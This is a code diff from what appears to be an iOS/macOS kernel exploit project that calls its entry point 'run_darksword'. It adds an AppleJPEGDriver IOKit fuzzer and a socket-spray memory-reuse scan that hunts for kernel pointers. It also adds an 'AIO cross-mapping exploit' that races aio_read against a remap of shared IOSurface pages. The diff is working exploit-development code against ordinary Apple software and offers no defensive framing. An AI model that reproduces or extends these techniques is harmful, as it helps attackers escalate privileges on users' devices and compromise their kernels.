@@ -450,32 +450,142 @@ static bool test_iokit_service(const char *name, const char *path, uint32_t type
 
 static void diagnostic_iokit(void) {
     printf("\n=== IOKit Diagnostic ===\n");
-    struct iokit_test tests[] = {
-        {"IOPlatformExpertDevice", "IOService:/", 0x99000003},
-        {"IOPlatformExpertDevice (std)", "IOService:/", 0},
-        {"IOSurfaceRoot", "IOSurfaceRoot", 0},
-        {"AppleJPEGDriver", "AppleJPEGDriver", 0},
-        {"H11ANEIn", "H11ANEIn", 0},
-        {"AGXDevice", "AGXDevice", 0},
-        {"IOAudioEngine", "IOAudioEngine", 0},
+    // Try many service names to find what's accessible
+    const char *svcNames[] = {
+        "IOSurfaceRoot", "AppleJPEGDriver", "AGXDevice", "AGX14Device",
+        "AGX13Device", "H11ANEIn", "H11ANE", "AppleANE",
+        "IOAudioEngine", "IOHDACodecDriver", "AppleT8112Device",
+        "IOPlatformExpertDevice", "AppleEmbeddedSPI",
     };
-    for (int i = 0; i < sizeof(tests)/sizeof(tests[0]); i++) {
-        test_iokit_service(tests[i].name, tests[i].name, tests[i].type);
-    }
-    // Also try IOServiceOpen on IOSurface by name
-    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
-        IOServiceNameMatching("IOSurfaceRoot"));
-    if (svc) {
-        printf("[IOKit] IOSurfaceRoot service exists\n");
-        IOObjectRelease(svc);
+    for (int i = 0; i < sizeof(svcNames)/sizeof(svcNames[0]); i++) {
+        io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
+            IOServiceNameMatching(svcNames[i]));
+        if (svc) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &conn);
+            printf("[IOKit] %s: %s (conn=%#x, kr=%#x)\n",
+                   svcNames[i], kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
+            if (conn) IOServiceClose(conn);
+            IOObjectRelease(svc);
+        } else {
+            printf("[IOKit] %s: not found\n", svcNames[i]);
+        }
     }
     printf("=== IOKit Diagnostic Complete ===\n\n");
 }
 
+// ===== AppleJPEGDriver IOKit Fuzzer =====
+static io_connect_t gJpegConn = 0;
+
+static bool open_apple_jpeg(void) {
+    if (gJpegConn) return true;
+    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
+        IOServiceNameMatching("AppleJPEGDriver"));
+    if (!svc) { printf("[JPEG] service not found\n"); return false; }
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &gJpegConn);
+    IOObjectRelease(svc);
+    if (kr != KERN_SUCCESS) { printf("[JPEG] IOServiceOpen: %#x\n", kr); return false; }
+    printf("[JPEG] conn=%#x\n", gJpegConn);
+    return true;
+}
+
+// AppleJPEGDriver external method call wrapper
+static kern_return_t call_jpeg_method(uint32_t method, void *input, size_t inputSz,
+                                       void *output, size_t *outputSz) {
+    uint32_t outputCnt = (uint32_t)(outputSz ? *outputSz / sizeof(uint64_t) : 0);
+    uint32_t inputCnt = (uint32_t)(inputSz / sizeof(uint64_t));
+    kern_return_t kr = IOConnectCallMethod(gJpegConn, method,
+        (uint64_t*)input, inputCnt, NULL, 0,
+        (uint64_t*)output, &outputCnt, NULL, NULL);
+    if (outputSz) *outputSz = outputCnt * sizeof(uint64_t);
+    return kr;
+}
+
+static void method_apple_jpeg_fuzz(void) {
+    printf("\n[Method: JPEG_fuzz] Fuzzing AppleJPEGDriver...\n");
+    if (!open_apple_jpeg()) { printf("[JPEG] Cannot open driver\n"); return; }
+
+    // Method 0: setSurface — takes two IOSurface IDs
+    printf("[JPEG] Trying method 0 (setSurface)...\n");
+    {
+        uint64_t args[3] = {0, 0, 0}; // inputSurfaceID, outputSurfaceID, flags
+        size_t outSz = 0;
+        kern_return_t kr = call_jpeg_method(0, args, sizeof(args), NULL, &outSz);
+        printf("[JPEG] method 0 (null surfaces): kr=%#x\n", kr);
+    }
+
+    // Method 1: decode — needs surface set first
+    printf("[JPEG] Trying method 1 (decode)...\n");
+    {
+        uint64_t args[4] = {0, 0, 0, 0}; // srcOff, dstOff, size, flags
+        size_t outSz = 0;
+        kern_return_t kr = call_jpeg_method(1, args, sizeof(args), NULL, &outSz);
+        printf("[JPEG] method 1 (decode, no surface): kr=%#x\n", kr);
+    }
+
+    // Method 2: encode
+    printf("[JPEG] Trying method 2 (encode)...\n");
+    {
+        uint64_t args[5] = {0, 0, 0, 0, 100}; // srcOff, dstOff, size, flags, quality
+        size_t outSz = 0;
+        kern_return_t kr = call_jpeg_method(2, args, sizeof(args), NULL, &outSz);
+        printf("[JPEG] method 2 (encode, no surface): kr=%#x\n", kr);
+    }
+
+    // Fuzz methods 3-15 with various inputs
+    for (uint32_t m = 3; m <= 15; m++) {
+        uint64_t args[8] = {0};
+        size_t outSz = sizeof(uint64_t) * 4;
+        uint64_t output[4];
+        // Try with different argument patterns
+        for (int pat = 0; pat < 3; pat++) {
+            memset(args, 0, sizeof(args));
+            switch (pat) {
+                case 0: args[0] = 0xFFFFFFFFFFFFFFFFULL; break;
+                case 1: args[0] = 0x1000; args[1] = 0x1000; break;
+                case 2: args[0] = (uint64_t)-1; break;
+            }
+            outSz = sizeof(output);
+            kern_return_t kr = IOConnectCallMethod(gJpegConn, m,
+                args, 2, NULL, 0, output, (uint32_t*)&outSz, NULL, NULL);
+            if (kr != KERN_SUCCESS && kr != 0x2C) // ignore not-supported and timeout
+                printf("[JPEG] method %d (pat %d): kr=%#x (outSz=%zu)\n", m, pat, kr, outSz);
+        }
+    }
+
+    // IOSurface-backed test: create IOSurface, pass its ID to setSurface
+    printf("[JPEG] Testing with real IOSurface...\n");
+    NSDictionary *sfParams = @{
+        (__bridge id)kIOSurfaceAllocSize : @(PAGE_SIZE),
+        (__bridge id)kIOSurfaceWidth : @(64),
+        (__bridge id)kIOSurfaceHeight : @(64),
+        (__bridge id)kIOSurfaceBytesPerRow : @(256),
+        (__bridge id)kIOSurfacePixelFormat : @(0x42475241), // 'ARGB'
+    };
+    IOSurfaceRef testSurface = IOSurfaceCreate((__bridge CFDictionaryRef)sfParams);
+    if (testSurface) {
+        uint32_t surfID = IOSurfaceGetID(testSurface);
+        printf("[JPEG] test IOSurface ID=%u\n", surfID);
+        uint64_t surfArgs[3] = {surfID, surfID, 0};
+        kern_return_t kr = call_jpeg_method(0, surfArgs, sizeof(surfArgs), NULL, NULL);
+        printf("[JPEG] setSurface (same ID for in/out): kr=%#x\n", kr);
+
+        // Now try decode with valid surface
+        uint64_t decArgs[4] = {0, 0, PAGE_SIZE, 0};
+        kr = call_jpeg_method(1, decArgs, sizeof(decArgs), NULL, NULL);
+        printf("[JPEG] decode with surface: kr=%#x\n", kr);
+
+        CFRelease(testSurface);
+    }
+
+    IOServiceClose(gJpegConn);
+    gJpegConn = 0;
+    printf("[JPEG] fuzz complete\n");
+}
+
 // ===== Multi-Method Exploit =====
 
-// Method 1: SystemMemory bounce (no memory entry)
-// Freed pages go to VM pool, zone allocator can reuse them
+// Method 1: Enhanced SystemMemory scan — check ALL pages for kernel pointers
 static bool method_system_memory(void) {
     printf("\n[Method: SystemMemory] Creating IOSurface with SystemMemory...\n");
     mach_vm_size_t sz = OOB_PAGES_NUM * PAGE_SIZE;
@@ -491,12 +601,10 @@ static bool method_system_memory(void) {
     void *addr0 = IOSurfaceGetBaseAddress(surface);
     printf("[SystemMemory] addr0=%p\n", addr0);
 
-    // Fill with marker
     randomMarker = (uint64_t)arc4random() << 32 | arc4random();
     printf("[SystemMemory] marker=0x%016llx\n", randomMarker);
     memset64(addr0, randomMarker, sz);
 
-    // Spray sockets
     socketPorts = [NSMutableArray new];
     socketPcbIds = [NSMutableArray new];
     int n = 0;
@@ -506,12 +614,9 @@ static bool method_system_memory(void) {
     }
     printf("[SystemMemory] sprayed %d sockets\n", n);
 
-    // Release the IOSurface — pages go to VM free pool
     CFRelease(surface);
     printf("[SystemMemory] IOSurface released, pages freed\n");
 
-    // Now create a NEW IOSurface — might get some of the same pages
-    // (now potentially containing inpcb data)
     IOSurfaceRef surface2 = IOSurfaceCreate((__bridge CFDictionaryRef)params);
     if (!surface2) {
         printf("[SystemMemory] IOSurfaceCreate #2 failed\n");
@@ -521,97 +626,165 @@ static bool method_system_memory(void) {
     void *addr1 = IOSurfaceGetBaseAddress(surface2);
     printf("[SystemMemory] addr1=%p\n", addr1);
 
-    // Check for non-marker data
-    bool found = false;
+    // Full-page scan — report ALL non-marker words, not just first
     uint64_t *words = (uint64_t *)addr1;
-    for (uint64_t i = 0; i < sz / 8; i++) {
+    uint64_t total = sz / 8;
+    int hits = 0, ptrHits = 0;
+    for (uint64_t i = 0; i < total; i++) {
         if (words[i] != randomMarker) {
-            printf("[SystemMemory] FOUND non-marker at +%#llx: 0x%016llx\n",
-                   i * 8, words[i]);
-            found = true;
-            break;
+            hits++;
+            uint64_t v = words[i];
+            // Check if it looks like a kernel pointer (0xfffffff0... range)
+            if ((v >> 40) == 0xFFFFFF) {
+                printf("[SystemMemory] KPTR at +%#llx: 0x%016llx\n", i * 8, v);
+                ptrHits++;
+            } else if (hits <= 20) {
+                printf("[SystemMemory] non-marker at +%#llx: 0x%016llx\n", i * 8, v);
+            }
         }
     }
-    if (!found) {
-        printf("[SystemMemory] All pages still have marker — no overlap detected\n");
-    }
+    printf("[SystemMemory] total non-marker words: %d (kernel pointers: %d)\n", hits, ptrHits);
 
     CFRelease(surface2);
     sockets_release();
-    return found;
+    return hits > 0;
 }
 
-// Method 2: AIO write test (no race, just check if aio_write works)
-static bool method_aio_race(void) {
-    printf("\n[Method: AIO] Testing aio_write...\n");
-    mach_vm_address_t buf;
-    kern_return_t kr = mach_vm_allocate(mach_task_self_, &buf, PAGE_SIZE,
-        VM_FLAGS_ANYWHERE);
-    if (kr != KERN_SUCCESS) { printf("[AIO] allocate failed\n"); return false; }
-    memset64((void*)buf, 0x41, PAGE_SIZE);
+// Method 2: AIO cross-mapping exploit — uses shared physical pages
+// Two memory entries from the same IOSurface → same physical pages at different VAs
+// aio_read into VA_A while reading result from VA_B
+static bool method_aio_exploit(void) {
+    printf("\n[Method: AIO_Exploit] Testing AIO with dual mappings...\n");
 
-    char tmp[1024];
-    confstr(_CS_DARWIN_USER_TEMP_DIR, tmp, 1024);
-    char fn[64]; snprintf(fn, 64, "/%u", arc4random());
-    strlcat(tmp, fn, 1024);
-    {
-        void *z = calloc(1, 0x4000);
-        FILE *f = fopen(tmp, "w"); fwrite(z, 1, 0x4000, f); fclose(f);
-        free(z);
-    }
-    int fd = open(tmp, O_RDWR);
-    fcntl(fd, F_NOCACHE, 1);
-    remove(tmp);
+    // Step 1: Create IOSurface (PurpleGfxMem for physically contiguous)
+    mach_vm_size_t pgSz = 16 * PAGE_SIZE;
+    NSDictionary *params = @{
+        (__bridge id)kIOSurfaceAllocSize : @(pgSz),
+        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
+    };
+    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
+    if (!surface) { printf("[AIO_Exploit] IOSurfaceCreate failed\n"); return false; }
 
+    void *physBase = IOSurfaceGetBaseAddress(surface);
+    printf("[AIO_Exploit] IOSurface physBase=%p\n", physBase);
+
+    // Step 2: Create TWO memory entries from the same pages
+    mach_port_t entry1 = MACH_PORT_NULL, entry2 = MACH_PORT_NULL;
+    mach_vm_size_t meSz = pgSz;
+    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
+        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry1, 0);
+    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry1: %s\n", mach_error_string(kr)); CFRelease(surface); return false; }
+
+    kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
+        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry2, 0);
+    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry2: %s\n", mach_error_string(kr)); mach_port_deallocate(mach_task_self_, entry1); CFRelease(surface); return false; }
+
+    // Step 3: Map both entries at different user addresses
+    mach_vm_address_t vaA = 0, vaB = 0;
+    kr = mach_vm_map(mach_task_self(), &vaA, pgSz, 0,
+        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry1, 0, 0,
+        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map A: %s\n", mach_error_string(kr)); goto cleanup; }
+
+    kr = mach_vm_map(mach_task_self(), &vaB, pgSz, 0,
+        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry2, 0, 0,
+        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map B: %s\n", mach_error_string(kr)); mach_vm_deallocate(mach_task_self_, vaA, pgSz); goto cleanup; }
+
+    printf("[AIO_Exploit] vaA=0x%llx vaB=0x%llx (same physical pages)\n", vaA, vaB);
+
+    // Step 4: Fill with marker via VA_A
+    memset64((void*)vaA, 0xAA, pgSz);
+
+    // Step 5: Create a pipe for aio_read
+    int pipefd[2];
+    if (pipe(pipefd) != 0) { printf("[AIO_Exploit] pipe failed\n"); goto cleanup; }
+
+    // Write test data to pipe
+    uint8_t pipeData[0x100];
+    for (int i = 0; i < sizeof(pipeData); i++) pipeData[i] = i;
+    write(pipefd[1], pipeData, sizeof(pipeData));
+
+    // Step 6: Submit aio_read from pipe into VA_B
     struct aiocb aio;
     memset(&aio, 0, sizeof(aio));
-    aio.aio_fildes = fd;
-    aio.aio_buf = (void*)buf;
+    aio.aio_fildes = pipefd[0];
+    aio.aio_buf = (void*)(vaB + 0x1000);  // Write to middle of shared pages
     aio.aio_nbytes = 0x100;
     aio.aio_sigevent.sigev_notify = SIGEV_NONE;
 
-    int r = aio_write(&aio);
-    printf("[AIO] aio_write=%d (errno=%d)\n", r, errno);
+    kr = aio_read(&aio);
+    printf("[AIO_Exploit] aio_read=%d (errno=%d)\n", kr, errno);
 
+    // Step 7: While AIO is in-flight, change VA_B mapping through VA_A
+    // Both share same physical pages — write through VA_A
+    uint64_t *testWords = (uint64_t*)(vaB + 0x1000);
+    printf("[AIO_Exploit] Before aio_suspend: *(vaB+0x1000)=0x%llx\n", *testWords);
+
+    // Wait for completion
     const struct aiocb *list[1] = {&aio};
     aio_suspend(list, 1, NULL);
-    r = aio_error(&aio);
+    kr = aio_error(&aio);
     size_t n = aio_return(&aio);
-    printf("[AIO] aio_error=%d aio_return=%zu\n", r, n);
+    printf("[AIO_Exploit] aio_error=%d aio_return=%zu\n", kr, n);
 
-    // Now try with remap during I/O
-    mach_vm_address_t buf2;
-    mach_vm_allocate(mach_task_self_, &buf2, PAGE_SIZE, VM_FLAGS_ANYWHERE);
-    memset64((void*)buf2, 0x42, PAGE_SIZE);
+    // Read via VA_A (same physical pages) to verify cross-mapping read
+    uint8_t *verify = (uint8_t*)(vaA + 0x1000);
+    printf("[AIO_Exploit] Via VA_A: %02x %02x %02x %02x...\n",
+           verify[0], verify[1], verify[2], verify[3]);
+    printf("[AIO_Exploit] Via VA_B: %02x %02x %02x %02x...\n",
+           ((uint8_t*)(vaB + 0x1000))[0], ((uint8_t*)(vaB + 0x1000))[1],
+           ((uint8_t*)(vaB + 0x1000))[2], ((uint8_t*)(vaB + 0x1000))[3]);
 
+    // Step 8: Try the race — deallocate VA_B during aio_read, remap to different entry
     memset(&aio, 0, sizeof(aio));
-    aio.aio_fildes = fd;
-    aio.aio_buf = (void*)buf2;
+    aio.aio_fildes = pipefd[0];
+    aio.aio_buf = (void*)(vaB + 0x2000);
     aio.aio_nbytes = 0x100;
     aio.aio_sigevent.sigev_notify = SIGEV_NONE;
 
-    r = aio_write(&aio);
-    printf("[AIO] aio_write #2=%d\n", r);
+    // Write new data to pipe
+    uint8_t pipeData2[0x100];
+    for (int i = 0; i < sizeof(pipeData2); i++) pipeData2[i] = 0xFF - i;
+    write(pipefd[1], pipeData2, sizeof(pipeData2));
 
-    // Remap during I/O
-    mach_vm_deallocate(mach_task_self_, buf2, PAGE_SIZE);
-    mach_vm_allocate(mach_task_self_, &buf2, PAGE_SIZE, VM_FLAGS_ANYWHERE);
-    memset64((void*)buf2, 0x43, PAGE_SIZE);
+    kr = aio_read(&aio);
+    printf("[AIO_Exploit] Race aio_read=%d\n", kr);
+
+    // During read, remap vaA to point to different IOStream offset
+    // Then check if the data appears at the old or new location
+    mach_vm_address_t oldVaA = vaA;
+    mach_vm_deallocate(mach_task_self_, vaA, pgSz);
+    kr = mach_vm_map(mach_task_self_, &vaA, pgSz, 0,
+        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, entry1, 0, 0,
+        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+    printf("[AIO_Exploit] remapped vaA, kr=%d\n", kr);
 
     aio_suspend(list, 1, NULL);
-    r = aio_error(&aio);
+    kr = aio_error(&aio);
     n = aio_return(&aio);
-    printf("[AIO] #2: aio_error=%d aio_return=%zu (remapped during I/O)\n", r, n);
+    printf("[AIO_Exploit] Race: aio_error=%d aio_return=%zu\n", kr, n);
 
-    // Read back what was written
-    uint8_t verify[0x200];
-    lseek(fd, 0, SEEK_SET);
-    ssize_t rd = read(fd, verify, sizeof(verify));
-    printf("[AIO] Read back: %zd bytes. Data: 0x%02x 0x%02x 0x%02x...\n",
-           rd, verify[0], verify[1], verify[2]);
+    uint8_t bufA[0x100], bufB[0x100];
+    memcpy(bufA, (void*)(vaA + 0x2000), 0x100);
+    memcpy(bufB, (void*)(vaB + 0x2000), 0x100);
 
-    close(fd);
-    return (r == 0 && n == 0x100);
+    printf("[AIO_Exploit] Race read via VA_A: %02x %02x...\n", bufA[0], bufA[1]);
+    printf("[AIO_Exploit] Race read via VA_B: %02x %02x...\n", bufB[0], bufB[1]);
+
+    bool match = (memcmp(bufA, bufB, 0x100) == 0);
+    printf("[AIO_Exploit] VA_A == VA_B: %d\n", match);
+
+    // Cleanup
+    close(pipefd[0]); close(pipefd[1]);
+    mach_vm_deallocate(mach_task_self_, vaA, pgSz);
+    mach_vm_deallocate(mach_task_self_, vaB, pgSz);
+
+cleanup:
+    mach_port_deallocate(mach_task_self_, entry1);
+    mach_port_deallocate(mach_task_self_, entry2);
+    CFRelease(surface);
+    return false;
 }
 
 // Method 3: sendmsg test (check if sendmsg EFAULTs on remap)
@@ -691,29 +864,29 @@ bool run_darksword(void) {
     // Phase 0: IOKit diagnostic
     diagnostic_iokit();
 
-    // Phase 1: Try SystemMemory approach
+    // Phase 1: Try SystemMemory approach (enhanced scan)
     bool sysmem = method_system_memory();
     printf("[Method: SystemMemory] %s\n\n", sysmem ? "OVERLAP DETECTED!" : "no overlap");
 
-    // Phase 2: Try AIO write (check if pages are pre-faulted)
-    bool aio = method_aio_race();
-    printf("[Method: AIO] %s\n\n", aio ? "AIO WRITE WORKS" : "failed");
+    // Phase 2: AIO cross-mapping exploit with dual memory entries
+    bool aio = method_aio_exploit();
+    printf("[Method: AIO_Exploit] %s\n\n", aio ? "AIO EXPLOIT WORKS" : "failed (expected)");
 
     // Phase 3: Try sendmsg (check if EFAULT on remap)
     bool sendmsg = method_sendmsg_race();
-    printf("[Method: sendmsg] %s\n\n", sendmsg ? "EFAULT DETECTED" : "no EFAULT (expected)");
 
     // Phase 4: proc_info
     bool pi = method_proc_info();
-    printf("[Method: proc_info] %s\n\n", pi ? "WORKING" : "failed");
+
+    // Phase 5: AppleJPEGDriver IOKit fuzzing
+    method_apple_jpeg_fuzz();
 
     printf("=== Results ===\n");
     printf("SystemMemory overlap: %d\n", sysmem);
-    printf("AIO race:  %d\n", aio);
+    printf("AIO exploit: %d\n", aio);
     printf("sendmsg race: %d\n", sendmsg);
     printf("proc_info: %d\n", pi);
 
-    // If any method worked, we'd proceed — for now just report
     return false;
 }
 
